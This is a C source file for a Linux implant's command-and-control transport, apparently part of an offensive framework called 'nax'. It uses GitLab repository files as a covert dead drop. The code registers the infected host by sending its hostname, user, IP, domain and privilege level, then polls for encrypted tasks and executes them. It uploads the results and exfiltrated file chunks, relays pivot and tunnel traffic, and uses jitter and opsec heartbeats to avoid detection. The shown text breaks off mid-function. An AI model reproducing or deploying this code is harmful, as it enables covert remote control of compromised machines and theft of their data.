/* nax_linux/src/Transport/gitlab.c — GitLab Repository Files dead-drop transport
 *
 * Protocol (identical to graph/Azure transport — only the storage layer differs):
 *
 *   Agent upload:    c_<nonce>.dat
 *     [wm(4BE)][agentUID(16)][encLen(4BE)][base64(AES(frame))][bodyData]
 *
 *   Server response: r_<nonce>.dat
 *     AES-CBC(tasks_frame)
 *
 *   Agent results:   r_<nonce>_<seq8d>.dat
 *     [wm(4BE)][agentUID(16)][encLen(4BE)][base64(AES(frame))]
 *
 * All files live in NAX_GITLAB_REPO_PATH (default: repo root) on NAX_GITLAB_BRANCH.
 *
 * Required compile-time macros:
 *   -DNAX_GITLAB_MODE
 *   -DNAX_GITLAB_URL="https://gitlab.com"         (or self-hosted base URL)
 *   -DNAX_GITLAB_TOKEN="glpat-xxxx"               (Personal/Project Access Token)
 *   -DNAX_GITLAB_PROJECT="namespace/project"      (or numeric ID as string)
 *
 * Optional compile-time macros:
 *   -DNAX_GITLAB_BRANCH="main"                    (default: main)
 *   -DNAX_GITLAB_REPO_PATH="c2/data"              (default: repo root, no trailing slash)
 *   -DNAX_GITLAB_POLL_MS=3000                     (agent poll interval between attempts)
 *   -DNAX_GITLAB_POLL_MAX=15                      (agent max poll attempts for r_*.dat)
 *
 * Build: add -DNAX_GITLAB_MODE and link -lcurl
 */

#ifdef NAX_GITLAB_MODE

#include "nax_linux.h"
#include "opsec.h"
#include "nax_bof_sdk.h"
#include "sysinfo.h"
#ifdef __has_include
#  if __has_include("nax_config.h")
#    include "nax_config.h"
#  endif
#endif

#include <curl/curl.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <poll.h>
#include <sys/socket.h>
#include <openssl/ssl.h>

/* ===== defaults ===== */
#ifndef NAX_GITLAB_BRANCH
#define NAX_GITLAB_BRANCH "main"
#endif
#ifndef NAX_GITLAB_REPO_PATH
#define NAX_GITLAB_REPO_PATH ""
#endif
#ifndef NAX_GITLAB_POLL_MS
#define NAX_GITLAB_POLL_MS 3000
#endif
#ifndef NAX_GITLAB_POLL_MAX
#define NAX_GITLAB_POLL_MAX 15
#endif

/* ===== forward declarations from Core ===== */
extern int nax_encrypt(const uint8_t *key, const uint8_t *plain, uint32_t plain_len,
                       uint8_t *out, uint32_t *out_len);
extern int nax_decrypt(const uint8_t *key, const uint8_t *enc, uint32_t enc_len,
                       uint8_t *out, uint32_t *out_len);
extern int nax_build_result(uint32_t task_id, uint8_t status,
                            const uint8_t *data, uint32_t data_len,
                            uint8_t *out, uint32_t *out_len);
extern int nax_build_heartbeat(uint8_t *out, uint32_t *out_len);
extern int nax_frame_encode(uint8_t type, const uint8_t *body, uint32_t body_len,
                            uint8_t *out, uint32_t *out_len);
extern int nax_frame_decode(const uint8_t *in, uint32_t in_len,
                            uint8_t *type_out, uint8_t **body_out, uint32_t *body_len_out);
extern int nax_build_reg_body(
    const char *hostname, uint32_t hostname_len,
    const char *username, uint32_t username_len,
    uint8_t arch, uint32_t pid, uint32_t sleep_ms, uint32_t tid,
    const char *ip, uint32_t ip_len,
    const char *domain, uint32_t domain_len,
    const char *procname, uint32_t procname_len,
    uint8_t elevated, uint8_t os_major, uint8_t os_minor, uint16_t os_build,
    uint32_t ppid, uint32_t _r1, uint32_t _r2,
    const char *imgpath, uint32_t imgpath_len,
    uint8_t *out, uint32_t *out_len);
extern void nax_gather_sysinfo(NaxSysInfo *info);
extern uint32_t nax_process_downloads(NaxAgent *a, uint8_t *out, uint32_t out_cap);
extern void nax_process_tunnels(NaxAgent *a);
extern uint32_t nax_process_tunnels_ex(NaxAgent *a, uint8_t *out, uint32_t out_cap);
extern void nax_bof_sdk_init(void);
extern void nax_async_drain(void (*cb)(uint32_t, uint8_t, const char *, uint32_t, void *), void *user_data);
extern int  nax_decode_task(const uint8_t *, uint32_t, NaxTask *);
extern uint8_t nax_dispatch(NaxAgent *, NaxTask *, uint8_t **, uint32_t *);

/* ===== base64 encode ===== */
static const char b64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static char *b64_encode(const uint8_t *in, uint32_t in_len, uint32_t *out_len)
{
    uint32_t enc_len = 4 * ((in_len + 2) / 3);
    char *out = (char *)malloc(enc_len + 1);
    if (!out) return NULL;
    uint32_t j = 0;
    for (uint32_t i = 0; i < in_len; i += 3) {
        uint32_t a = in[i];
        uint32_t b = (i + 1 < in_len) ? in[i + 1] : 0;
        uint32_t c = (i + 2 < in_len) ? in[i + 2] : 0;
        uint32_t t = (a << 16) | (b << 8) | c;
        out[j++] = b64_table[(t >> 18) & 0x3F];
        out[j++] = b64_table[(t >> 12) & 0x3F];
        out[j++] = (i + 1 < in_len) ? b64_table[(t >> 6) & 0x3F] : '=';
        out[j++] = (i + 2 < in_len) ? b64_table[t & 0x3F] : '=';
    }
    out[j] = '\0';
    if (out_len) *out_len = j;
    return out;
}

/* ===== libcurl response buffer ===== */
typedef struct {
    uint8_t *data;
    uint32_t size;
} CurlBuf;

static size_t curl_write_cb(void *ptr, size_t size, size_t nmemb, void *userdata)
{
    CurlBuf *buf = (CurlBuf *)userdata;
    uint32_t new_size = buf->size + (uint32_t)(size * nmemb);
    uint8_t *new_data = (uint8_t *)realloc(buf->data, new_size + 1);
    if (!new_data) return 0;
    buf->data = new_data;
    memcpy(buf->data + buf->size, ptr, size * nmemb);
    buf->size = new_size;
    buf->data[buf->size] = '\0';
    return size * nmemb;
}

/* ===== helpers ===== */
static void sleep_ms(uint32_t ms)
{
    struct timespec ts = { (time_t)(ms / 1000), (long)((ms % 1000) * 1000000L) };
    nanosleep(&ts, NULL);
}

static uint32_t effective_sleep_ms(NaxAgent *a)
{
    if (a->cfg.sleep_ms == 0) return 0;
    if (a->cfg.jitter_pct == 0) return a->cfg.sleep_ms;
    uint32_t jit = (uint32_t)(((uint64_t)a->cfg.sleep_ms * a->cfg.jitter_pct) / 100);
    uint32_t offset = jit ? (uint32_t)(random() % jit) : 0;
    return (random() & 1) ? a->cfg.sleep_ms + offset
                           : (a->cfg.sleep_ms > offset ? a->cfg.sleep_ms - offset : 0);
}

static void gen_session_id(char *out)
{
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    uint32_t rnd = (uint32_t)(ts.tv_nsec ^ ts.tv_sec ^ (uint32_t)getpid());
    for (int i = 0; i < 16; i++) {
        rnd = rnd * 1664525u + 1013904223u;
        out[i] = (char)((rnd >> 16) & 0xFF);
    }
}

static void gen_nonce(char *out, size_t len)
{
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    uint32_t rnd = (uint32_t)(ts.tv_nsec ^ ts.tv_sec ^ (uint32_t)getpid());
    const char hex[] = "0123456789abcdef";
    for (size_t i = 0; i < len - 1; i++) {
        rnd = rnd * 1664525u + 1013904223u;
        out[i] = hex[(rnd >> 16) & 0xF];
    }
    out[len - 1] = '\0';
}

/* URL-encode a string (simple percent-encoding for path segments).
 * Encodes everything except unreserved chars and '/'. */
static char *url_encode_path(const char *s)
{
    static const char safe[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~";
    size_t len = strlen(s);
    char *out = (char *)malloc(len * 3 + 1);
    if (!out) return NULL;
    char *p = out;
    for (size_t i = 0; i < len; i++) {
        unsigned char c = (unsigned char)s[i];
        if (strchr(safe, c)) {
            *p++ = (char)c;
        } else if (c == '/') {
            /* Encode '/' as %2F so GitLab treats it as part of the file name,
             * not as a path separator in the URL. */
            *p++ = '%'; *p++ = '2'; *p++ = 'F';
        } else {
            const char hex[] = "0123456789ABCDEF";
            *p++ = '%';
            *p++ = hex[(c >> 4) & 0xF];
            *p++ = hex[c & 0xF];
        }
    }
    *p = '\0';
    return out;
}

/* Build the full repo file path: [REPO_PATH/]filename */
static void make_file_path(char *out, size_t out_cap, const char *filename)
{
    char _rp[NAX_GITLAB_REPO_PATH_LEN + 1]; NAX_GITLAB_REPO_PATH_WRITE(_rp);
    if (_rp[0]) {
        snprintf(out, out_cap, "%s/%s", _rp, filename);
    } else {
        snprintf(out, out_cap, "%s", filename);
    }
}

/* ===== GitLab Repository Files API ===== */

/* gitlab_api — low-level helper.
 * method   : "GET", "POST", "PUT", "DELETE", "HEAD"
 * api_path : e.g. "/projects/ns%2Fproj/repository/files/c_abc.dat"
 * body/blen: JSON body for mutating requests (NULL for GET/HEAD/DELETE)
 * resp_out : receives malloc'd response body (caller frees), set to NULL on error
 * Returns HTTP status code, or -1 on transport error. */
static int gitlab_api(const char *method, const char *api_path,
                      const uint8_t *body, uint32_t blen,
                      uint8_t **resp_out, uint32_t *resp_len_out)
{
    if (resp_out)     *resp_out     = NULL;
    if (resp_len_out) *resp_len_out = 0;

    char _gl_url[NAX_GITLAB_URL_LEN + 1]; NAX_GITLAB_URL_WRITE(_gl_url);
    char _gl_tok[NAX_GITLAB_TOKEN_LEN + 1]; NAX_GITLAB_TOKEN_WRITE(_gl_tok);

    char url[2048];
    snprintf(url, sizeof(url), "%s/api/v4%s", _gl_url, api_path);

    CURL *curl = curl_easy_init();
    if (!curl) return -1;

    struct curl_slist *headers = NULL;
    char auth_hdr[256];
    snprintf(auth_hdr, sizeof(auth_hdr), "PRIVATE-TOKEN: %s", _gl_tok);
    headers = curl_slist_append(headers, auth_hdr);
    if (body && blen > 0)
        headers = curl_slist_append(headers, "Content-Type: application/json");

    CurlBuf buf = {0};
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buf);
    if (body && blen > 0) {
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, (const char *)body);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)blen);
    }

    long status = 0;
    CURLcode rc = curl_easy_perform(curl);
    if (rc == CURLE_OK)
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &status);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    if (rc != CURLE_OK) {
        free(buf.data);
        return -1;
    }

    if (resp_out)     *resp_out     = buf.data;
    if (resp_len_out) *resp_len_out = buf.size;
    else              free(buf.data);

    return (int)status;
}

/* Return a URL-encoded copy of NAX_GITLAB_PROJECT (caller must free).
 * "darksblack/testing" → "darksblack%2Ftesting" so GitLab's API routes it
 * as a single project identifier and not as nested URL segments. */
static char *encoded_project_id(void)
{
    char _proj[NAX_GITLAB_PROJECT_LEN + 1]; NAX_GITLAB_PROJECT_WRITE(_proj);
    return url_encode_path(_proj);
}

/* Upload (create or update) a file.  Returns 0 on success, -1 on error.
 * Tries POST first; if the file already exists (400) retries with PUT. */
static int gitlab_upload(const char *filename, const uint8_t *data, uint32_t data_len)
{
    char file_path[512];
    make_file_path(file_path, sizeof(file_path), filename);

    char *enc    = url_encode_path(file_path);
    char *projid = encoded_project_id();
    if (!enc || !projid) { free(enc); free(projid); return -1; }
    char api_path[1024];
    snprintf(api_path, sizeof(api_path),
             "/projects/%s/repository/files/%s",
             projid, enc);
    free(enc);
    free(projid);

    /* Base64-encode the raw binary data for the GitLab API "content" field */
    uint32_t b64_len = 0;
    char *b64 = b64_encode(data, data_len, &b64_len);
    if (!b64) return -1;

    /* Build JSON payload (same body for POST and PUT) */
    uint32_t json_cap = b64_len + 256;
    char *json = (char *)malloc(json_cap);
    if (!json) { free(b64); return -1; }

    /* Try POST (create) first.  If the file already exists GitLab returns 400;
     * in that case retry with PUT (update).  This avoids the extra HEAD round-
     * trip of gitlab_file_exists and works correctly even when the directory
     * was just initialised by the listener's .gitkeep. */
    char _branch[NAX_GITLAB_BRANCH_LEN + 1]; NAX_GITLAB_BRANCH_WRITE(_branch);
    int json_len = snprintf(json, json_cap,
        "{\"branch\":\"%s\",\"encoding\":\"base64\","
        "\"commit_message\":\"c %s\","
        "\"content\":\"%s\"}",
        _branch, filename, b64);
    free(b64);
    if (json_len <= 0 || (uint32_t)json_len >= json_cap) { free(json); return -1; }

    int status = gitlab_api("POST", api_path,
                            (const uint8_t *)json, (uint32_t)json_len,
                            NULL, NULL);
    DBG("gitlab_upload: POST %s -> %d", filename, status);

    if (status == 400) {
        /* File already exists — update it */
        /* Patch commit_message to say "u" instead of "c" */
        char *cm = strstr(json, "\"c ");
        if (cm) { cm[1] = 'u'; }
        status = gitlab_api("PUT", api_path,
                            (const uint8_t *)json, (uint32_t)json_len,
                            NULL, NULL);
        DBG("gitlab_upload: PUT %s -> %d", filename, status);
    }

    free(json);
    return (status == 200 || status == 201) ? 0 : -1;
}

/* Download a file's raw content.  Returns malloc'd buffer (caller frees) or NULL. */
static uint8_t *gitlab_download(const char *filename, uint32_t *out_len)
{
    char file_path[512];
    make_file_path(file_path, sizeof(file_path), filename);

    char *enc    = url_encode_path(file_path);
    char *projid = encoded_project_id();
    if (!enc || !projid) { free(enc); free(projid); return NULL; }
    char _dlbranch[NAX_GITLAB_BRANCH_LEN + 1]; NAX_GITLAB_BRANCH_WRITE(_dlbranch);
    char api_path[1024];
    snprintf(api_path, sizeof(api_path),
             "/projects/%s/repository/files/%s/raw?ref=%s",
             projid, enc, _dlbranch);
    free(enc);
    free(projid);

    uint8_t *resp = NULL;
    uint32_t resp_len = 0;
    int status = gitlab_api("GET", api_path, NULL, 0, &resp, &resp_len);
    DBG("gitlab_download: %s -> status=%d len=%u", filename, status, resp_len);
    if (status != 200) { free(resp); return NULL; }
    *out_len = resp_len;
    return resp;
}

/* Delete a file from the repo.  Silently ignores 404. */
static void gitlab_delete(const char *filename)
{
    char file_path[512];
    make_file_path(file_path, sizeof(file_path), filename);

    char *enc    = url_encode_path(file_path);
    char *projid = encoded_project_id();
    if (!enc || !projid) { free(enc); free(projid); return; }
    char api_path[1024];
    snprintf(api_path, sizeof(api_path),
             "/projects/%s/repository/files/%s",
             projid, enc);
    free(enc);
    free(projid);

    /* JSON body required for DELETE */
    char _delbranch[NAX_GITLAB_BRANCH_LEN + 1]; NAX_GITLAB_BRANCH_WRITE(_delbranch);
    char json[256];
    int jlen = snprintf(json, sizeof(json),
        "{\"branch\":\"%s\",\"commit_message\":\"delete %s\"}",
        _delbranch, filename);
    if (jlen <= 0) return;
    gitlab_api("DELETE", api_path, (const uint8_t *)json, (uint32_t)jlen, NULL, NULL);
}

/* Poll for r_<nonce>.dat until it appears or attempts are exhausted. */
static uint8_t *gitlab_poll_response(const char *resp_filename, uint32_t *out_len)
{
    int attempts = NAX_GITLAB_POLL_MAX;
    while (attempts-- > 0) {
        sleep_ms(NAX_GITLAB_POLL_MS);
        uint8_t *data = gitlab_download(resp_filename, out_len);
        if (data) return data;
    }
    return NULL;
}

/* ===== build upload file ===== */
/* Format: [wm(4BE)][agentUID(16)][encLen(4BE)][base64(AES(frame))][bodyData]
 * Identical to graph transport — listener parses the same layout. */
static uint8_t *build_upload_file(const uint8_t *agent_uid,
                                  const uint8_t *beat_enc, uint32_t beat_enc_len,
                                  const uint8_t *body, uint32_t body_len,
                                  uint32_t *out_len)
{
    uint32_t b64_len = 0;
    char *b64 = b64_encode(beat_enc, beat_enc_len, &b64_len);
    if (!b64) return NULL;

    uint32_t total = 4 + 16 + 4 + b64_len + body_len;
    uint8_t *file = (uint8_t *)malloc(total);
    if (!file) { free(b64); return NULL; }

    uint32_t wm = NAX_LISTENER_WM;
    file[0] = (wm >> 24) & 0xFF;
    file[1] = (wm >> 16) & 0xFF;
    file[2] = (wm >>  8) & 0xFF;
    file[3] =  wm        & 0xFF;
    memcpy(file + 4, agent_uid, 16);
    file[20] = (b64_len >> 24) & 0xFF;
    file[21] = (b64_len >> 16) & 0xFF;
    file[22] = (b64_len >>  8) & 0xFF;
    file[23] =  b64_len        & 0xFF;
    memcpy(file + 24, b64, b64_len);
    if (body && body_len > 0)
        memcpy(file + 24 + b64_len, body, body_len);

    free(b64);
    *out_len = total;
    return file;
}

/* ===== send result via GitLab upload ===== */
static const uint8_t *g_session_uid = NULL;
static uint32_t       g_result_seq   = 0;

static void gitlab_send_result_upload(NaxAgent *a, uint32_t task_id, uint8_t status,
                                      const uint8_t *data, uint32_t data_len)
{
    uint8_t *frame = (uint8_t *)malloc(NAX_IO_CAP);
    if (!frame) return;
    uint32_t frame_len = NAX_IO_CAP;
    if (nax_build_result(task_id, status, data, data_len, frame, &frame_len) < 0) {
        free(frame); return;
    }
    uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK + 32;
    uint8_t *enc = (uint8_t *)malloc(enc_cap);
    if (!enc) { free(frame); return; }
    uint32_t enc_len = enc_cap;
    if (nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len) < 0) {
        free(frame); free(enc); return;
    }
    free(frame);

    uint32_t file_len = 0;
    uint8_t *file = build_upload_file(g_session_uid, enc, enc_len, NULL, 0, &file_len);
    free(enc);
    if (!file) return;

    char nonce[17]; gen_nonce(nonce, sizeof(nonce));
    char r_name[48];
    snprintf(r_name, sizeof(r_name), "r_%s_%08u.dat", nonce, g_result_seq++);
    DBG("gitlab_send_result_upload: %s", r_name);
    for (int _retry = 0; _retry < 5; _retry++) {
        if (_retry > 0) sleep_ms((uint32_t)(_retry * 1500));
        if (gitlab_upload(r_name, file, file_len) == 0) break;
    }
    free(file);
}

/* ===== async BOF result sender ===== */
static void gitlab_async_result_cb(uint32_t task_id, uint8_t status,
                                    const char *output, uint32_t output_len,
                                    void *user_data)
{
    NaxAgent *a = (NaxAgent *)user_data;
    gitlab_send_result_upload(a, task_id, status, (const uint8_t *)output, output_len);
}

/* ===== handle inbound server frame ===== */
static void handle_server_frame(NaxAgent *a, const uint8_t *data, uint32_t data_len)
{
    uint8_t *plain = (uint8_t *)malloc(data_len + NAX_AES_BLOCK);
    if (!plain) return;
    uint32_t plain_len = data_len + NAX_AES_BLOCK;
    if (nax_decrypt(a->cfg.aes_key, data, data_len, plain, &plain_len) < 0) {
        free(plain); return;
    }

    uint8_t  *cur = plain;
    uint32_t  rem = plain_len;
    while (rem >= NAX_FRAME_HDR) {
        uint8_t   ft = 0;
        uint8_t  *fb = NULL;
        uint32_t  fbl = 0;
        if (nax_frame_decode(cur, rem, &ft, &fb, &fbl) < 0) break;
        uint32_t step = NAX_FRAME_HDR + fbl;
        if (step > rem) break;
        cur += step;
        rem -= step;

        if (ft == NAX_WIRE_NO_TASKS || ft == NAX_WIRE_PROFILE) break;
        if (ft != NAX_WIRE_TASK) continue;

        NaxTask task;
        if (nax_decode_task(fb, fbl, &task) < 0) continue;

        uint8_t *result = NULL;
        uint32_t result_len = 0;
        uint8_t st = nax_dispatch(a, &task, &result, &result_len);

        if (st != NAX_STATUS_ASYNC)
            gitlab_send_result_upload(a, task.task_id, st, result, result_len);

        if (result) free(result);
    }
    free(plain);
}

/* ===== main agent loop ===== */
void nax_gitlab_main(NaxAgent *a)
{
    signal(SIGPIPE, SIG_IGN);
    char _dbg_url[NAX_GITLAB_URL_LEN+1];     NAX_GITLAB_URL_WRITE(_dbg_url);
    char _dbg_proj[NAX_GITLAB_PROJECT_LEN+1]; NAX_GITLAB_PROJECT_WRITE(_dbg_proj);
    char _dbg_br[NAX_GITLAB_BRANCH_LEN+1];   NAX_GITLAB_BRANCH_WRITE(_dbg_br);
    char _dbg_rp[NAX_GITLAB_REPO_PATH_LEN+1]; NAX_GITLAB_REPO_PATH_WRITE(_dbg_rp);
    DBG("nax_gitlab_main: starting — url=%s project=%s branch=%s path=%s",
        _dbg_url, _dbg_proj, _dbg_br, _dbg_rp[0] ? _dbg_rp : "(root)");

    curl_global_init(CURL_GLOBAL_ALL);
    nax_bof_sdk_init();

    NaxSysInfo info;
    nax_gather_sysinfo(&info);

    uint8_t session_uid[16];
    gen_session_id((char *)session_uid);
    g_session_uid = session_uid;

    DBG("session_uid: %02x%02x%02x%02x%02x%02x%02x%02x"
        "%02x%02x%02x%02x%02x%02x%02x%02x",
        session_uid[0],  session_uid[1],  session_uid[2],  session_uid[3],
        session_uid[4],  session_uid[5],  session_uid[6],  session_uid[7],
        session_uid[8],  session_uid[9],  session_uid[10], session_uid[11],
        session_uid[12], session_uid[13], session_uid[14], session_uid[15]);

    while (a->running) {
        /* ── Registration ── */
        int registered = 0;
        while (a->running && !registered) {
            uint8_t reg_body[4096]; uint32_t reg_body_len = sizeof(reg_body);
            if (nax_build_reg_body(
                    info.hostname, strlen(info.hostname),
                    info.username, strlen(info.username),
                    NAX_ARCH_CURRENT, info.pid, a->cfg.sleep_ms, info.tid,
                    info.ip, strlen(info.ip),
                    info.domain, strlen(info.domain),
                    info.procname, strlen(info.procname),
                    info.elevated, info.os_major, info.os_minor, info.os_build,
                    info.ppid, 0, 0,
                    info.imgpath, strlen(info.imgpath),
                    reg_body, &reg_body_len) < 0) { sleep(3); continue; }

            uint8_t *frame = (uint8_t *)malloc(NAX_IO_CAP);
            if (!frame) { sleep(3); continue; }
            uint32_t frame_len = NAX_IO_CAP;
            if (nax_frame_encode(NAX_WIRE_REGISTER, reg_body, reg_body_len,
                                 frame, &frame_len) < 0) { free(frame); sleep(3); continue; }

            uint32_t beat_enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK + 32;
            uint8_t *beat_enc = (uint8_t *)malloc(beat_enc_cap);
            if (!beat_enc) { free(frame); sleep(3); continue; }
            uint32_t beat_enc_len = beat_enc_cap;
            if (nax_encrypt(a->cfg.aes_key, frame, frame_len,
                            beat_enc, &beat_enc_len) < 0) {
                free(frame); free(beat_enc); sleep(3); continue;
            }
            free(frame);

            char nonce[17]; gen_nonce(nonce, sizeof(nonce));
            char c_name[32], r_name[32];
            snprintf(c_name, sizeof(c_name), "c_%s.dat", nonce);
            snprintf(r_name, sizeof(r_name), "r_%s.dat", nonce);

            uint32_t file_len = 0;
            uint8_t *file = build_upload_file(session_uid, beat_enc, beat_enc_len,
                                              NULL, 0, &file_len);
            free(beat_enc);
            if (!file) { sleep(3); continue; }

            DBG("REGISTER: uploading %s (%u bytes)", c_name, file_len);
            int rc = gitlab_upload(c_name, file, file_len);
            free(file);
            if (rc < 0) { DBG("REGISTER: upload failed"); sleep(5); continue; }

            DBG("REGISTER: polling for %s", r_name);
            uint32_t resp_len = 0;
            uint8_t *resp = gitlab_poll_response(r_name, &resp_len);
            gitlab_delete(c_name);

            if (!resp || resp_len == 0) {
                if (resp) free(resp);
                sleep(5);
                continue;
            }

            /* Decrypt and check for PROFILE or NO_TASKS */
            uint8_t *plain = (uint8_t *)malloc(resp_len + 32);
            if (!plain) { free(resp); sleep(3); continue; }
            uint32_t plain_len = resp_len + 32;
            if (nax_decrypt(a->cfg.aes_key, resp, resp_len, plain, &plain_len) < 0) {
                free(resp); free(plain); sleep(3); continue;
            }
            free(resp);
            gitlab_delete(r_name);

            uint8_t ft = 0; uint8_t *fb = NULL; uint32_t fbl = 0;
            int decode_rc = nax_frame_decode(plain, plain_len, &ft, &fb, &fbl);
            DBG("REGISTER: resp %u bytes decode_rc=%d ft=0x%02x", resp_len, decode_rc, ft);
            if (decode_rc == 0 && (ft == NAX_WIRE_PROFILE || ft == NAX_WIRE_NO_TASKS)) {
                registered = 1;
                DBG("REGISTER: success");
            }
            free(plain);

            if (!registered) {
                DBG("REGISTER: not registered, retrying");
                sleep(5);
            }
        }

        if (!a->running) break;

        /* ── Heartbeat loop ── */
        DBG("entering heartbeat loop");
        while (a->running) {
            if (!a->tunnel_head) {
                uint32_t slp = effective_sleep_ms(a);
                if (slp > 0) sleep_ms(slp);
            }

            nax_opsec_heartbeat();
            nax_async_drain(gitlab_async_result_cb, a);

            /* Build heartbeat frame */
            uint8_t hb_frame[NAX_FRAME_HDR + 64];
            uint32_t hb_frame_len = sizeof(hb_frame);
            if (nax_build_heartbeat(hb_frame, &hb_frame_len) < 0) continue;

            /* Build beat: [wm(4BE)][agentUID(16)][heartbeat_frame] */
            uint32_t beat_plain_len = 4 + 16 + hb_frame_len;
            uint8_t *beat_plain = (uint8_t *)malloc(beat_plain_len);
            if (!beat_plain) continue;
            uint32_t wm = NAX_LISTENER_WM;
            beat_plain[0] = (wm >> 24) & 0xFF;
            beat_plain[1] = (wm >> 16) & 0xFF;
            beat_plain[2] = (wm >>  8) & 0xFF;
            beat_plain[3] =  wm        & 0xFF;
            memcpy(beat_plain + 4, session_uid, 16);
            memcpy(beat_plain + 20, hb_frame, hb_frame_len);

            uint32_t beat_enc_cap = beat_plain_len + NAX_AES_IV + NAX_AES_BLOCK + 32;
            uint8_t *beat_enc = (uint8_t *)malloc(beat_enc_cap);
            if (!beat_enc) { free(beat_plain); continue; }
            uint32_t beat_enc_len = beat_enc_cap;
            if (nax_encrypt(a->cfg.aes_key, beat_plain, beat_plain_len,
                            beat_enc, &beat_enc_len) < 0) {
                free(beat_plain); free(beat_enc); continue;
            }
            free(beat_plain);

            /* Send pending download chunks — max 2 per heartbeat cycle to
             * avoid saturating the GitLab branch with consecutive commits. */
            {
                uint8_t *dbuf = (uint8_t *)malloc(NAX_IO_CAP);
                if (dbuf) {
                    uint32_t dlen = nax_process_downloads(a, dbuf, NAX_IO_CAP);
                    if (dlen > 0) {
                        uint32_t off = 0;
                        int chunks_sent = 0;
                        while (off + 8 <= dlen && chunks_sent < 2) {
                            uint32_t tid   = (uint32_t)dbuf[off]   | ((uint32_t)dbuf[off+1] << 8)
                                           | ((uint32_t)dbuf[off+2] << 16) | ((uint32_t)dbuf[off+3] << 24);
                            uint32_t dsize = (uint32_t)dbuf[off+4] | ((uint32_t)dbuf[off+5] << 8)
                                           | ((uint32_t)dbuf[off+6] << 16) | ((uint32_t)dbuf[off+7] << 24);
                            if (off + 8 + dsize > dlen) break;
                            gitlab_send_result_upload(a, tid, NAX_STATUS_OK,
                                                      dbuf + off + 8, dsize);
                            off += 8 + dsize;
                            chunks_sent++;
                        }
                    }
                    free(dbuf);
                }
            }

            /* Collect body data (tunnels + pivot children) */
            uint8_t *body = NULL;
            uint32_t body_len = 0;
            {
                /* Tunnels */
                uint8_t *tbuf = (uint8_t *)malloc(4 * 1024 * 1024);
                if (tbuf) {
                    uint32_t tlen = nax_process_tunnels_ex(a, tbuf, 4 * 1024 * 1024);
                    if (tlen > 0) {
                        uint8_t *tf = (uint8_t *)malloc(tlen + 256);
                        if (tf) {
                            uint32_t tf_len = tlen + 256;
                            if (nax_build_result(0, NAX_STATUS_TUNNEL, tbuf, tlen,
                                                 tf, &tf_len) == 0) {
                                body = tf;
                                body_len = tf_len;
                            } else {
                                free(tf);
                            }
                        }
                    }
                    free(tbuf);
                }

                /* Pivot children — large messages (chunks ≥1KB) are limited to
                 * 2 per cycle to avoid saturating the GitLab branch.
                 * Small messages (heartbeats, ACKs <1KB) are always drained
                 * so they don't block chunks in the socket queue. */
                NaxPivot **pp = &a->pivot_head;
                while (*pp) {
                    NaxPivot *p = *pp;
                    int broken = 0;
                    int large_msgs_sent = 0;
                    struct pollfd pfd = { .fd = p->sock, .events = POLLIN };
                    while (1) {
                        if (large_msgs_sent >= 2) break;
                        if (poll(&pfd, 1, 0) <= 0 || !(pfd.revents & POLLIN)) break;
                        uint8_t lenbuf[4]; ssize_t got = 0;
                        while (got < 4) {
                            ssize_t r = p->ssl
                                ? SSL_read((SSL*)p->ssl, lenbuf + got, 4 - (int)got)
                                : recv(p->sock, lenbuf + got, 4 - got, 0);
                            if (r <= 0) { broken = 1; break; }
                            got += r;
                        }
                        if (broken) break;
                        uint32_t msg_len = (uint32_t)lenbuf[0] | ((uint32_t)lenbuf[1] << 8) |
                                           ((uint32_t)lenbuf[2] << 16) | ((uint32_t)lenbuf[3] << 24);
                        if (msg_len == 0 || msg_len > 4 * 1024 * 1024) { broken = 1; break; }
                        uint8_t *msg = (uint8_t *)malloc(msg_len);
                        if (!msg) { broken = 1; break; }
                        got = 0;
                        while ((uint32_t)got < msg_len) {
                            ssize_t r = p->ssl
                                ? SSL_read((SSL*)p->ssl, msg + got, (int)(msg_len - (uint32_t)got))
                                : recv(p->sock, msg + got, msg_len - (uint32_t)got, 0);
                            if (r <= 0) { free(msg); broken = 1; break; }
                            got += r;
                        }
                        if (broken) break;
                        DBG("pivot data: msg_len=%u from pivot_id=%u", msg_len, p->pivot_id);
                        uint32_t rd_len = 1 + 4 + 4 + msg_len;
                        uint8_t *rd = (uint8_t *)malloc(rd_len);
                        if (rd) {
                            rd[0] = NAX_PIV_TYPE_DATA;
                            rd[1] = (uint8_t)(p->pivot_id);       rd[2] = (uint8_t)(p->pivot_id >> 8);
                            rd[3] = (uint8_t)(p->pivot_id >> 16); rd[4] = (uint8_t)(p->pivot_id >> 24);
                            rd[5] = (uint8_t)(msg_len);            rd[6] = (uint8_t)(msg_len >> 8);
                            rd[7] = (uint8_t)(msg_len >> 16);      rd[8] = (uint8_t)(msg_len >> 24);
                            memcpy(rd + 9, msg, msg_len);
                            gitlab_send_result_upload(a, 0, NAX_STATUS_OK, rd, rd_len);
                            free(rd);
                            /* Only count large messages toward the per-cycle limit */
                            if (msg_len >= 1024) large_msgs_sent++;
                        }
                        free(msg);
                    }
                    if (broken) {
                        uint8_t ul[6];
                        ul[0] = NAX_PIV_TYPE_UNLINK;
                        ul[1] = (uint8_t)(p->pivot_id);       ul[2] = (uint8_t)(p->pivot_id >> 8);
                        ul[3] = (uint8_t)(p->pivot_id >> 16); ul[4] = (uint8_t)(p->pivot_id >> 24);
